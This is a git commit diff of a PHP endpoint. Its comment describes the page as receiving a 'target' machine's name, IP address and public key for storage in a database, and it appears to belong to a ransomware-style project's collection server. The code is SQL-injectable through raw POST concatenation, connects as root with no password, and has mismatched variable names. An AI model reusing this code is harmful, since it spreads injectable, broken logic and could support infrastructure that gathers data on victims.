773e8d7a415249dfda29e65c272df09e647768bd
Pierre <pierre.rispal@gmail.com>
2018-01-04 13:29:52 +0100

    ip adresse prise automatiquement

--- server/post_temp.php
+++ server/post_temp.php
@@ -4,9 +4,9 @@ include "database.php";
 * page temporaire de réception des données de la cible
 * et enregistrement de ces données dans la base de données
 */
-if(isset($_POST['machineName']) && isset($_POST['ipAddress']) && isset($_POST['publickey'])){
+if(isset($_POST['machineName']) && isset($_POST['publickey'])){
 	$machineName=$_POST['machineName'];
-	$ipAddress=$_POST['ipAddress'];
+	$ipAddress=$_SERVER['REMOTE_ADDR'];
 	$publicKey=$_POST['publicKey'];
 
 	connect("root","")->query("INSERT INTO `infos` (`id`, `machineName`, `ipAddress`, `publickey`) VALUES (NULL, '".$machineName."', '".$ipAddress."','".$publickey."');");
